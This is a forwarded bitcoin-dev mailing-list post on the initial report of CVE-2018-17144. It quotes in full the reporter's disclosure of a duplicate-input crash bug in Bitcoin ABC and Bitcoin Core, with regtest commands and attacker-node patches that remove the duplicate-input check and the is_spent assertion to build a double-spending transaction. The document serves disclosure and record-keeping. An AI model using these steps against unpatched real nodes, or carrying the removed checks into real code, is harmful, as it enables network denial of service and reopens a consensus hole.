@@ -1,0 +1,311 @@
+From: kanzure@gmail.com (Bryan Bishop)
+Date: Sat, 22 Sep 2018 12:54:12 -0500
+Subject: [bitcoin-dev] Fwd: [bitcoin-core-dev] On the initial notice of
+	CVE-2018-17144
+In-Reply-To: <CAAS2fgR9Swxv3=-u_uHrgGtfn0WhXEuOV78TFpOewCuwb3fmUA@mail.gmail.com>
+References: <CAAS2fgR9Swxv3=-u_uHrgGtfn0WhXEuOV78TFpOewCuwb3fmUA@mail.gmail.com>
+Message-ID: <CABaSBaxk7sJ9WFstC_aj7W==+puXkGNAqA-n96wDzOvjaC-HCg@mail.gmail.com>
+
+---------- Forwarded message ----------
+From: Gregory Maxwell via bitcoin-core-dev <
+bitcoin-core-dev at lists.linuxfoundation.org>
+Date: Sat, Sep 22, 2018 at 12:12 PM
+Subject: [bitcoin-core-dev] On the initial notice of CVE-2018-17144
+To: bitcoin-core-dev at lists.linuxfoundation.org
+
+
+For some reason I don't understand, Andrea Suisani is stating on
+twitter that the the report by awemany was a report of an inflation
+bug, contrary to the timeline we published.   This is not the case:
+the report specifically stated that inflation was not possible because
+the node crashed. It also described a reproduction of the crash, but
+not of inflation.
+
+I generally understand how someone could be confused about what a
+report they hadn't seen said, but I'm confused in this case because
+Andrea Suisani was copied on the report to us. So I'm not sure what is
+up with that, perhaps the message got lost in email.  If the reporter
+knew the bug permitted inflation, they still specifically reported
+otherwise to us.
+
+Since people are also expressing doubt that awemany was actually the
+author of the report, I'll include it here in its entity to aid
+people's validation of the claim(s). There is a better test for the
+crash issue include in master branch of the Bitcoin repository, the
+reporter's reproduction instructions here are only included for
+completeness.
+
+Cheers,
+
+
+Date: Mon, 17 Sep 2018 14:57:46 +0000
+To: Pieter Wuille <pieter.wuille at gmail.com>, deadalnix
+<deadalnix at gmail.com>, Andrea Suisani <sickpig at gmail.com>, Gregory
+Maxwell <gmaxwell at gmail.com>, "Wladimir J. van der Laan"
+<laanwj at gmail.com>
+From: beardnboobies <beardnboobies at protonmail.com>
+Subject: Zero day exploit in Bitcoin ABC and Bitcoin Core
+
+Dear Bitcoiners,
+
+Please find attached an encrypted description of a crashing zero day
+exploit for Bitcoin Core as well as Bitcoin ABC. This has not been
+reproduced for Bitcoin Unlimited, though for advisory reasons, I am
+sending it to one of their members that I could find a PGP key for as
+well.
+
+Please forward this to any party who might have a valid interest,
+including Bitcoin miners.
+
+Thank you very much.
+
+===
+
+Problem description:
+
+The following, miner-exploitable zero day has been found in Bitcoin ABC as
+well as in Bitcoin Core:
+
+Duplicate inputs are not checked in CheckBlock,
+only when they are accepted into the mempool.
+
+This creates a problem insofar as a transaction might bypass
+the mempool when it is included in a block, for example if
+it is transmitted as an extra transaction along with a compact
+block.
+
+A later assertion assert(is_spent) in SpendCoins (in validation.cpp)
+seems to prevent the worse outcome of monetary inflation by
+the comparatively better result of crashing the node.
+
+To reproduce (Description is for Bitcoin ABC, but applies similarly to
+Bitcoin Core):
+
+Create one instance of ABC bitcoind without the patch below
+applied (A) and create on instance of ABC with the patch applied (B).
+The patch removes sending of transactions and testing for double-spent
+inputs for the attacker node.
+
+Run both in regtest mode and point them to different data directories,
+like so and connect them together:
+A: ./bitcoind -regtest -rpcport=15000 -listen -debug -datadir=/tmp/abc.1
+B: ./bitcoind -regtest -rpcport=15001 -connect=localhost -debug
+-datadir=/tmp/abc.2
+
+Now on the prepared attacker node B, create a bunch of blocks and a
+transaction
+that double-spends its input, like  so for example:
+
+> ./bitcoin-cli -regtest -datadir=/tmp/abc.2 -rpcport=15001 generate 200
+
+> ./bitcoin-cli -regtest -datadir=/tmp/abc.2 -rpcport=15001 getnewaddress
+<address>
+
+> ./bitcoin-cli -regtest -datadir=/tmp/abc.2 -rpcport=15001 sendtoaddress
+<address>
+<resulting-txid>
+
+> ./bitcoin-tx -regtest -create in=<resulting-txid>:<vout>
+in=<resulting-txid>:<vout> outaddr=99.9:<address>
+<resulting-txn-hex>
+
+The double entry of the input here is not a typo. This is the desired
+double-spend.
+
+Sign the resulting transaction hex like so:
+
+> ./bitcoin-cli -regtest -datadir=/tmp/abc.2 -rpcport=15001
+signrawtransaction <txid>
+<signed-txn-hex>
+
+For Core, this step needs to be adapted to signrawtransactionwithkey.
+And send the result into the small regtest test netwrok:
+> ./bitcoin-cli -regtest -datadir=/tmp/abc.2 -rpcport=15001
+sendrawtransaction <signed-txn-hex>
+
+Voila, your node A should have just aborted like this:
+
+bitcoind: validation.cpp:1083: void SpendCoins(CCoinsViewCache&, const
+CTransaction&, CTxUndo&, int): Assertion `is_spent' failed.
+Aborted (core dumped)
+
+If you like this work or want to pay out a bounty for finding a zero day,
+please do so in BCH to this address. Thank you very much in advance.
+
+bitcoincash:qr5yuq3q40u7mxwqz6xvamkfj8tg45wyus7fhqzug5
+
+
+The patch for ABC:
+
+diff --git a/src/consensus/tx_verify.cpp b/src/consensus/tx_verify.cpp
+index ee909deb9..ff7942361 100644
+--- a/src/consensus/tx_verify.cpp
++++ b/src/consensus/tx_verify.cpp
+@@ -229,7 +229,7 @@ static bool CheckTransactionCommon(const CTransaction
+&tx,
+
+     // Check for duplicate inputs - note that this check is slow so we
+skip it
+     // in CheckBlock
+-    if (fCheckDuplicateInputs) {
++    if (0) {
+         std::set<COutPoint> vInOutPoints;
+         for (const auto &txin : tx.vin) {
+             if (!vInOutPoints.insert(txin.prevout).second) {
+diff --git a/src/net_processing.cpp b/src/net_processing.cpp
+index e4ecc793c..ee1cc3cda 100644
+--- a/src/net_processing.cpp
++++ b/src/net_processing.cpp
+@@ -1269,12 +1269,6 @@ static void ProcessGetData(const Config
+&config, CNode *pfrom,
+                             // however we MUST always provide at least
+what the
+                             // remote peer needs.
+                             typedef std::pair<unsigned int, uint256>
+PairType;
+-                            for (PairType &pair : merkleBlock.vMatchedTxn)
+{
+-                                connman->PushMessage(
+-                                    pfrom,
+-                                    msgMaker.Make(NetMsgType::TX,
+-                                                  *block.vtx[pair.first]));
+-                            }
+                         }
+                         // else
+                         // no response
+@@ -1321,25 +1315,6 @@ static void ProcessGetData(const Config
+&config, CNode *pfrom,
+                 bool push = false;
+                 auto mi = mapRelay.find(inv.hash);
+                 int nSendFlags = 0;
+-                if (mi != mapRelay.end()) {
+-                    connman->PushMessage(
+-                        pfrom,
+-                        msgMaker.Make(nSendFlags, NetMsgType::TX,
+*mi->second));
+-                    push = true;
+-                } else if (pfrom->timeLastMempoolReq) {
+-                    auto txinfo = mempool.info(inv.hash);
+-                    // To protect privacy, do not answer getdata using the
+-                    // mempool when that TX couldn't have been INVed
+in reply to
+-                    // a MEMPOOL request.
+-                    if (txinfo.tx &&
+-                        txinfo.nTime <= pfrom->timeLastMempoolReq) {
+-                        connman->PushMessage(pfrom,
+-                                             msgMaker.Make(nSendFlags,
+-                                                           NetMsgType::TX,
+-                                                           *txinfo.tx));
+-                        push = true;
+-                    }
+-                }
+                 if (!push) {
+                     vNotFound.push_back(inv);
+                 }
+diff --git a/src/validation.cpp b/src/validation.cpp
+index a31546432..a9edbb956 100644
+--- a/src/validation.cpp
++++ b/src/validation.cpp
+@@ -1080,7 +1080,7 @@ void SpendCoins(CCoinsViewCache &view, const
+CTransaction &tx, CTxUndo &txundo,
+     for (const CTxIn &txin : tx.vin) {
+         txundo.vprevout.emplace_back();
+         bool is_spent = view.SpendCoin(txin.prevout,
+&txundo.vprevout.back());
+-        assert(is_spent);
++        //assert(is_spent);
+     }
+ }
+
+
+----
+The same patch for Core:
+
+diff --git a/src/consensus/tx_verify.cpp b/src/consensus/tx_verify.cpp
+index 0628ec1d4..a06f77f8b 100644
+--- a/src/consensus/tx_verify.cpp
++++ b/src/consensus/tx_verify.cpp
+@@ -181,7 +181,7 @@ bool CheckTransaction(const CTransaction& tx,
+CValidationState &state, bool fChe
+     }
+
+     // Check for duplicate inputs - note that this check is slow so
+we skip it in CheckBlock
+-    if (fCheckDuplicateInputs) {
++    if (0) {
+         std::set<COutPoint> vInOutPoints;
+         for (const auto& txin : tx.vin)
+         {
+diff --git a/src/net_processing.cpp b/src/net_processing.cpp
+index b48a3bd22..9b7fb5839 100644
+--- a/src/net_processing.cpp
++++ b/src/net_processing.cpp
+@@ -1219,8 +1219,6 @@ void static ProcessGetBlockData(CNode* pfrom,
+const CChainParams& chainparams, c
+                     // Thus, the protocol spec specified allows for
+us to provide duplicate txn here,
+                     // however we MUST always provide at least what
+the remote peer needs
+                     typedef std::pair<unsigned int, uint256> PairType;
+-                    for (PairType& pair : merkleBlock.vMatchedTxn)
+-                        connman->PushMessage(pfrom,
+msgMaker.Make(SERIALIZE_TRANSACTION_NO_WITNESS, NetMsgType::TX,
+*pblock->vtx[pair.first]));
+                 }
+                 // else
+                     // no response
+@@ -1284,18 +1282,6 @@ void static ProcessGetData(CNode* pfrom, const
+CChainParams& chainparams, CConnm
+             bool push = false;
+             auto mi = mapRelay.find(inv.hash);
+             int nSendFlags = (inv.type == MSG_TX ?
+SERIALIZE_TRANSACTION_NO_WITNESS : 0);
+-            if (mi != mapRelay.end()) {
+-                connman->PushMessage(pfrom, msgMaker.Make(nSendFlags,
+NetMsgType::TX, *mi->second));
+-                push = true;
+-            } else if (pfrom->timeLastMempoolReq) {
+-                auto txinfo = mempool.info(inv.hash);
+-                // To protect privacy, do not answer getdata using
+the mempool when
+-                // that TX couldn't have been INVed in reply to a
+MEMPOOL request.
+-                if (txinfo.tx && txinfo.nTime <=
+pfrom->timeLastMempoolReq) {
+-                    connman->PushMessage(pfrom,
+msgMaker.Make(nSendFlags, NetMsgType::TX, *txinfo.tx));
+-                    push = true;
+-                }
+-            }
+             if (!push) {
+                 vNotFound.push_back(inv);
+             }
+diff --git a/src/validation.cpp b/src/validation.cpp
+index 947192be0..66536af24 100644
+--- a/src/validation.cpp
++++ b/src/validation.cpp
+@@ -1315,7 +1315,7 @@ void UpdateCoins(const CTransaction& tx,
+CCoinsViewCache& inputs, CTxUndo &txund
+         for (const CTxIn &txin : tx.vin) {
+             txundo.vprevout.emplace_back();
+             bool is_spent = inputs.SpendCoin(txin.prevout,
+&txundo.vprevout.back());
+-            assert(is_spent);
++            //assert(is_spent);
+         }
+     }
+     // add outputs
+_______________________________________________
+bitcoin-core-dev mailing list
+bitcoin-core-dev at lists.linuxfoundation.org
+https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-core-dev
+
+
+
+-- 
+- Bryan
+http://heybryan.org/
+1 512 203 0507
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180922/422a36a3/attachment-0001.html>
